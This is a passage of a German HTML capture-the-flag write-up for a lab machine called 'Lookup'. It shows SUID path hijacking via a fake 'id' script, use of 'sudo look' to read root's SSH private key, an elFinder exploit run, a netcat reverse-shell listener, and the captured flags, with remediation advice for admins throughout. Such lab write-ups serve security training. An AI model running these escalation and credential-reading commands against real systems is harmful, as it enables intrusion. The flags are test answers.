+             <p class="evaluation"><strong>Bewertung:</strong> Der initiale Zugriff als `www-data` wurde erfolgreich über den elFinder-Exploit erlangt und eine stabilere Reverse Shell wurde aufgebaut.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):** Führen Sie Enumeration als `www-data` durch. Suchen Sie nach Konfigurationsdateien, Datenbankzugängen, SUID-Dateien, Cronjobs und `sudo`-Rechten.
+<br><strong>Empfehlung (Admin):** elFinder patchen oder entfernen. Rechte des Webserver-Benutzers minimieren.</p>
+        </section>
+
+        <section id="privilege-escalation-1">
+            <h2>Privilege Escalation (pwm Path Hijacking)</h2>
+            <p class="analysis"><strong>Analyse:</strong> In der `www-data`-Shell werden SUID-Dateien gesucht.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@lookup:/...$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div> <!-- Maskierung: > -->
+                     <pre>
+... (Standard SUID-Dateien) ...
+      <span class="command">9154     20 -rwsr-sr-x   1 root     root               17176 Jan 11  2024 /usr/sbin/pwm</span> <span class="comment"><-- Ungewöhnlich!</span>
+... (Standard SUID-Dateien) ...
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Eine ungewöhnliche SUID/SGID-Datei `/usr/sbin/pwm` wird gefunden.</p>
+            <p class="analysis"><strong>Analyse Fortsetzung:** Die Datei `/usr/sbin/pwm` wird näher untersucht.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@lookup:/home/think$ <span class="command">file /usr/sbin/pwm</span></div>
+                    <pre>/usr/sbin/pwm: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=01ec8570b00af8889beebc5f93c6d56fb9cc1083, for GNU/Linux 3.2.0, not stripped</pre>
+                     <div class="prompt">www-data@lookup:/home/think$ <span class="command">strings /usr/sbin/pwm</span></div>
+                     <pre>
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+...
+<span class="command">[!] Running 'id' command to extract the username and user ID (UID)</span>
+[-] Error executing id command
+uid=%*u(%[^)])
+[-] Error reading username from id command
+[!] ID: %s
+<span class="command">/home/%s/.passwords</span>
+[-] File /home/%s/.passwords not found
+...
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> `pwm` ist eine 64-bit ELF-Datei mit SUID- und SGID-Bit. Die `strings`-Ausgabe zeigt, dass das Programm den `id`-Befehl ausführt, um den aktuellen Benutzernamen zu erhalten, und dann versucht, eine Datei namens `.passwords` im Home-Verzeichnis dieses Benutzers zu öffnen (`/home/%s/.passwords`). Da `pwm` SUID/SGID Root ist und den `id`-Befehl ohne vollständigen Pfad aufruft, ist es anfällig für Path Hijacking.</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Die Path-Hijacking-Schwachstelle wird ausgenutzt:
+1.  Ein Benutzer (`think`) wird identifiziert (vermutlich durch `ls /home`).
+2.  Ein bösartiges Skript namens `id` wird in `/tmp` erstellt, das die Ausgabe `uid=1000(think) ...` erzeugt.
+3.  Dieses Skript wird ausführbar gemacht.
+4.  `/tmp` wird an den Anfang der `PATH`-Umgebungsvariable gesetzt.
+5.  `/usr/sbin/pwm` wird ausgeführt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@lookup:/tmp$ <span class="command">nano id</span></div>
+                     <pre>[Inhalt der Datei /tmp/id]
+echo "uid=1000(think) gid=1000(think) groups=1000(think)"</pre>
+                    <div class="prompt">www-data@lookup:/tmp$ <span class="command">chmod +x id</span></div>
+                    <div class="prompt">www-data@lookup:/tmp$ <span class="command">export PATH=/tmp:$PATH</span></div>
+                    <div class="prompt">www-data@lookup:/tmp$ <span class="command">/usr/sbin/pwm</span></div>
+                     <pre>
+[!] Running 'id' command to extract the username and user ID (UID) <span class="comment"><-- Führt jetzt /tmp/id aus</span>
+[!] ID: think
+<span class="password">jose1006</span> <span class="comment"><-- Inhalt von /home/think/.passwords</span>
+<span class="password">jose1004</span>
+...
+<span class="password">thepassword</span> <span class="comment"><-- Potenzielles Passwort?</span>
+...
+<span class="password">jose.medina.</span>
+...
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Path-Hijacking-Angriff ist erfolgreich. `pwm` führt `/tmp/id` statt `/usr/bin/id` aus, erhält "think" als Benutzernamen und liest (da es mit Root-Rechten läuft) die Datei `/home/think/.passwords` aus, deren Inhalt ausgegeben wird. Die Liste enthält das Wort `<span class="password">thepassword</span>`, was ein wahrscheinliches Passwort für den Benutzer `think` ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Versuchen Sie, sich per SSH als Benutzer `think` mit dem Passwort `thepassword` anzumelden.
+<br><strong>Empfehlung (Admin):** Beheben Sie die Schwachstelle in `pwm`:
+    *   Rufen Sie `id` mit dem vollständigen Pfad `/usr/bin/id` auf.
+    *   Überprüfen Sie, ob das SUID/SGID-Bit für `pwm` wirklich notwendig ist. Wenn nicht, entfernen Sie es (`chmod ug-s /usr/sbin/pwm`).
+    *   Speichern Sie Passwörter niemals im Klartext in Dateien wie `.passwords`. Verwenden Sie Hashing oder sicherere Speichermechanismen.
+    *   Korrigieren Sie die Berechtigungen für `.passwords`, sodass nur der Besitzer darauf zugreifen kann.</p>
+        </section>
+
+        <section id="lateral-movement">
+            <h2>Lateral Movement (SSH as think)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich per SSH als Benutzer `think` mit dem durch Path Hijacking gefundenen Passwort `thepassword` anzumelden.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh think@192.168.2.164</span></div>
+                     <pre>
+think@192.168.2.164's password: <span class="password">[Passwort thepassword eingegeben]</span>
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)
+...
+Last login: Thu Jan 11 20:17:32 2024 from 192.168.1.13
+</pre>
+                     <div class="prompt">think@lookup:~$ <span class="command">id</span></div>
+                     <pre>uid=1000(think) gid=1000(think) groups=1000(think)</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Login als `think` ist erfolgreich. Der Angreifer hat nun eine Shell als dieser Benutzer.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Führen Sie Enumeration als `think` durch. Prüfen Sie `sudo -l`. Lesen Sie die User-Flag.
+<br><strong>Empfehlung (Admin):** Ändern Sie das Passwort für den Benutzer `think`. Beheben Sie die `pwm`-Schwachstelle.</p>
+        </section>
+
+        <section id="privilege-escalation-2">
+            <h2>Privilege Escalation (think to root via sudo look)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Die `sudo`-Rechte für den Benutzer `think` werden überprüft.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">think@lookup:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+[sudo] password for think: <span class="password">[Passwort thepassword eingegeben]</span>
+Matching Defaults entries for think on lookup:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User think may run the following commands on lookup:
+    <span class="command">(ALL) /usr/bin/look</span>
+</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! `think` darf `/usr/bin/look` als jeder Benutzer (`ALL`), einschließlich Root, ausführen. `look` wird normalerweise verwendet, um Zeilen in einer sortierten Datei zu finden, die mit einem bestimmten String beginnen. Laut GTFOBins kann `look` jedoch missbraucht werden, um beliebige Dateien zu lesen, wenn es mit `sudo` ausgeführt wird.</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Das Passwort für `think` wird geändert (optionaler Schritt).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">think@lookup:~$ <span class="command">passwd</span></div>
+                     <pre>
+Changing password for think.
+Current password: <span class="password">[Passwort thepassword eingegeben]</span>
+New password: <span class="password">[Neues Passwort]</span>
+Retype new password: <span class="password">[Neues Passwort]</span>
+passwd: password updated successfully
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Der GTFOBins-Exploit für `sudo look` wird verwendet, um den privaten SSH-Schlüssel des Root-Benutzers zu lesen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">think@lookup:~$ <span class="command">LFILE=/root/.ssh/id_rsa</span></div>
+                     <div class="prompt">think@lookup:~$ <span class="command">sudo look '' "$LFILE"</span></div>
+                     <pre><span class="password">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAptm2+DipVfUMY+7g9Lcmf/h23TCH7qKRg4Penlti9RKW2XLSB5wR
+Qcqy1zRFDKtRQGhfTq+YfVfboJBPCfKHdpQqM/zDb//ZlnlwCwKQ5XyTQU/vHfRfU0pnR
+... (Key Body) ...
+DgTNYtefYf4EpwAAABFyb290QHVidW50dXNlcnZlcg
+-----END OPENSSH PRIVATE KEY-----</span></pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Exploit ist erfolgreich! Der private SSH-Schlüssel des Root-Benutzers wird ausgegeben. Dies ermöglicht den direkten Root-Zugriff.</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Der Root-Schlüssel wird lokal gespeichert (`id_rsa`). Mit `ssh2john` wird geprüft, ob der Schlüssel passwortgeschützt ist.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh2john id_rsa > hash</span></div> <!-- Maskierung: > -->
+                     <pre><span class="password">id_rsa has no password!</span></pre>
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">chmod 600 id_rsa</span></div>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Root-SSH-Schlüssel ist nicht passwortgeschützt.</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Mit dem Root-SSH-Schlüssel wird sich per SSH als `root` angemeldet.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh -i id_rsa root@192.168.2.164</span></div>
+                     <pre>
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)
+...
+Last login: Wed Sep 11 09:24:50 2024
+</pre>
+                     <div class="prompt">root@lookup:~#</div> <!-- Root-Shell! -->
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Login als `root` ist erfolgreich. Die Privilegieneskalation wurde abgeschlossen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):** Lesen Sie die Root-Flag.
+<br><strong>Empfehlung (Admin):** Entfernen Sie sofort die unsichere `sudo`-Regel für `look`. Erlauben Sie niemals `sudo` für Befehle, die zum Lesen beliebiger Dateien missbraucht werden können. Beschränken Sie den direkten Root-Login per SSH und verwenden Sie stattdessen `sudo` von einem unprivilegierten Konto aus (mit starkem Passwort oder MFA). Schützen Sie private SSH-Schlüssel.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Die Flags werden gelesen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">root@lookup:~# <span class="command">ls</span></div>
+                    <pre>... root.txt ...</pre>
+                    <div class="prompt">root@lookup:~# <span class="command">cat root.txt</span></div>
+                    <pre><span class="password">5a285a9f257e45c68bb6c9f9f57d18e8</span></pre>
+                     <div class="prompt">root@lookup:~# <span class="command">cat /home/think/user.txt</span></div>
+                     <pre><span class="password">38375fb4dd8baa2b2039ac03d92b820e</span></pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Beide Flags wurden erfolgreich ausgelesen.</p>
+        </section>
+
+
+        <section id="poc">
+            <h2>Proof of Concept (POC)</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Dieser POC beschreibt die Kette von Schwachstellen: Brute-Force von Login-Credentials, Entdeckung einer Subdomain mit elFinder, Ausnutzung einer bekannten RCE-Schwachstelle in elFinder für Initial Access als `www-data`, Eskalation zu `think` durch Path Hijacking einer SUID-Binary (`pwm`) zum Auslesen von Passwörtern und schließlich Eskalation zu `root` durch Ausnutzung einer unsicheren `sudo`-Regel für `look` zum Lesen des Root-SSH-Keys.</p>
+
+            <h3>POC Schritt 1: Initial Access (www-data via elFinder RCE)</h3>
+            <p class="analysis"><strong>Schwachstellen:</strong> Schwache Passwörter, exponierte elFinder-Instanz, elFinder RCE (CVE-...).</p>
+            <p class="analysis"><strong>Schritte:</strong></p>
+            <ol>
+                <li>Brute-Force Login (`admin:password123`, `jose:password123`).</li>
+                <li>Subdomain `files.lookup.hmv` finden (z.B. via Analyse nach Login oder VHost-Scan).</li>
+                <li>elFinder-Instanz unter `/elFinder/` identifizieren.</li>
+                <li>`searchsploit elFinder` -> Exploit `46481.py` finden.</li>
+                <li>Exploit ausführen: `python2 46481.py "http://files.lookup.hmv/elFinder/"`.</li>
+                <li>Reverse Shell (z.B. via Python) von der Exploit-Shell zu `nc -lvnp 5555` starten.</li>
+            </ol>
+            <p class="analysis"><strong>Ergebnis:</strong> Shell als `www-data`.</p>
+
+            <h3>POC Schritt 2: Privilege Escalation (www-data zu think via pwm Path Hijack)</h3>
+            <p class="analysis"><strong>Schwachstelle:</strong> SUID/SGID Binary `/usr/sbin/pwm` ruft `id` ohne Pfad auf, Klartextpasswörter in `/home/think/.passwords`.</p>
+            <p class="analysis"><strong>Voraussetzungen:</strong> Shell als `www-data`.</p>
+            <p class="analysis"><strong>Schritte:</strong></p>
+            <ol>
+                <li>Fake `id`-Skript in `/tmp` erstellen: `echo 'echo "uid=1000(think)..."' > /tmp/id`.</li>
+                <li>Ausführbar machen: `chmod +x /tmp/id`.</li>
+                <li>PATH manipulieren: `export PATH=/tmp:$PATH`.</li>
+                <li>`pwm` ausführen: `/usr/sbin/pwm`.</li>
+                <li>Passwort `thepassword` aus der Ausgabe extrahieren.</li>
+                <li>SSH-Login: `ssh think@lookup.hmv` (Passwort: `thepassword`).</li>
+            </ol>
+            <p class="analysis"><strong>Ergebnis:</strong> Shell als `think`.</p>
+
+            <h3>POC Schritt 3: Privilege Escalation (think zu root via sudo look)</h3>
+            <p class="analysis"><strong>Schwachstelle:</strong> Unsichere `sudo`-Regel: `(ALL) /usr/bin/look`.</p>
+            <p class="analysis"><strong>Voraussetzungen:</strong> Shell als `think`.</p>
+            <p class="analysis"><strong>Schritte (GTFOBins für look):</strong></p>
+            <ol>
+                <li>Root-SSH-Key lesen: `LFILE=/root/.ssh/id_rsa; sudo look '' "$LFILE"`.</li>
+                <li>Key extrahieren, als `id_rsa` speichern, `chmod 600 id_rsa`.</li>
+                <li>SSH-Login als Root: `ssh -i id_rsa root@lookup.hmv`.</li>
+            </ol>
+            <p class="analysis"><strong>Ergebnis:</strong> Root-Shell.</p>
+            <p class="analysis"><strong>Beweismittel:</strong> Erfolgreicher Root-Login, Lesen von `/root/root.txt` möglich.</p>
+
+             <p class="evaluation"><strong>Risikobewertung:</strong> Sehr hoch. Eine Kette aus schwachen Passwörtern, einer bekannten Webanwendungs-Schwachstelle (elFinder RCE), einer unsicheren SUID-Binary mit Path-Hijacking-Potenzial und unsicheren `sudo`-Regeln ermöglicht die vollständige Kompromittierung.</p>
+             <p class="recommendation"><strong>Empfehlungen:**
+*   **Admin:** Starke Passwörter erzwingen. elFinder patchen/entfernen. SUID-Binary `pwm` sichern (Pfad zu `id` fixen, SUID/SGID entfernen falls möglich) oder entfernen. `.passwords`-Datei löschen, sichere Passwortspeicherung nutzen. `sudo`-Regeln drastisch einschränken (kein `look`). Root-Login per SSH idealerweise deaktivieren.
+*   **Pentester:** Die einzelnen Eskalationspfade und Schwachstellen klar dokumentieren.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/think/user.txt</div>
+                     <div class="flag-value"><span class="password">38375fb4dd8baa2b2039ac03d92b820e</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">5a285a9f257e45c68bb6c9f9f57d18e8</span></div>
+                 </div>
+             </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 27. Januar 2025</p> <!-- Datum angepasst -->
+    </footer>
+</body>
+</html>
